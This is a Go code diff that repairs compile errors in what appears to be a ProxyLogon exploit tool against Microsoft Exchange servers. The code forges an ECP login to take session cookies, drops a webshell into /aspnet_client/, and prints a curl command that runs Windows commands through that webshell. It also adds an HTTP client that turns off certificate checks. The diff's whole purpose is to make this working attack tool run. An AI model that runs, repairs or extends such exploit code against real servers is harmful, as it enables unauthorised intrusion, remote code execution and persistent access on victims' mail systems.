@@ -53,18 +53,7 @@ func splitmsexch(msexch string) string {
 	return msexch4
 }
 
-func Between(str, starting, ending string) string {
-	s := strings.Index(str, starting)
-	if s < 0 {
-		return ""
-	}
-	s += len(starting)
-	e := strings.Index(str[s:], ending)
-	if e < 0 {
-		return ""
-	}
-	return str[s : s+e]
-}
+// Between 定义在 chkproxyshell.go 中，这里不再重复声明，避免同包重定义编译错误。
 
 // 声明两个新的错误返回
 var ErrNotPath = errors.New("Path Required")
@@ -146,11 +135,14 @@ func getshell(target, mail, FQDN, sid string) {
 	if !strings.Contains(target, "http") {
 		target = "http://" + target
 	}
+	// 修复作用域问题：sess_id / msExchEcpCanary 后续在函数体中被使用，
+	// 必须提到闭包外声明，之前在回调内用 := 声明导致外层引用编译失败。
+	var sess_id, msExchEcpCanary string
 	if c1 := util.GetClient(target + "/ecp/" + random_name); nil != c1 {
 		c1.DoGetWithClient4SetHd(nil, target+"/ecp/"+random_name, http.MethodPost, strings.NewReader(proxyLogon_request), func(do *http.Response, err error, szU string) {
 			if nil != do && 2 <= len(do.Header["Set-Cookie"]) {
-				sess_id := splitsess(do.Header["Set-Cookie"][0])
-				msExchEcpCanary := splitmsexch(do.Header["Set-Cookie"][1])
+				sess_id = splitsess(do.Header["Set-Cookie"][0])
+				msExchEcpCanary = splitmsexch(do.Header["Set-Cookie"][1])
 				fmt.Println("[+] Login success!!!")
 				fmt.Println("[+] ASP.NET_SessionId=" + sess_id + "; msExchEcpCanary=" + msExchEcpCanary)
 				if c2 := util.GetClient(target + "/ecp/" + random_name); nil != c2 {
@@ -273,7 +265,7 @@ func getshell(target, mail, FQDN, sid string) {
 			}
 
 			s, _ := ioutil.ReadAll(do5.Body)
-			fmt.Printf("[+] the request shell response data:\n" + string(s))
+			fmt.Printf("[+] the request shell response data:\n%s", s)
 			if do5.StatusCode == 200 {
 				fmt.Println("[+] Webshell drop at " + target + "/aspnet_client/" + shell_name + " .. Have fun!")
 				fmt.Println("[+] Code: curl -ik " + target + "/aspnet_client/" + shell_name + ` -d 'lUc1f3r11=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'`)
@@ -328,6 +320,8 @@ func exploit(szUrl, email string) {
 				server_name := do6.Header["X-Feserver"][0]
 				fmt.Println("[+] Got FQDN: " + server_name)
 				path_maybe_vuln := "/ecp/pentest.js"
+				// 修复：原代码在此处引用了未声明的 c，补齐带超时/忽略证书校验的 HTTP 客户端
+				cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
 				payload := `<?xml version="1.0" encoding="utf-8"?>
 		<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 		xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
@@ -358,7 +352,7 @@ func exploit(szUrl, email string) {
 				request7.Header.Add("Connection", "close")
 				request7.Header.Add("Content-Type", "text/xml")
 
-				do7, err := c.Do(request7)
+				do7, err := cli.Do(request7)
 				if err != nil {
 					fmt.Println("[-] Hmm?, is that exchange server?")
 					return
@@ -389,7 +383,7 @@ func exploit(szUrl, email string) {
 					request8.Header.Add("Connection", "close")
 					request8.Header.Add("Content-Type", "text/xml")
 
-					do8, err := c.Do(request8)
+					do8, err := cli.Do(request8)
 					if err != nil {
 						fmt.Println("[-] Hmm?, is that exchange server?")
 						return
@@ -416,7 +410,7 @@ func exploit(szUrl, email string) {
 					request9.Header.Add("X-Requestid", "{C715155F-2BE8-44E0-BD34-2960067874C8}:500")
 					request9.Header.Add("User-Agent", "Hello-World")
 
-					do9, err := c.Do(request9)
+					do9, err := cli.Do(request9)
 					if err != nil {
 						fmt.Println("[-] Hmm?, is that exchange server?")
 						return
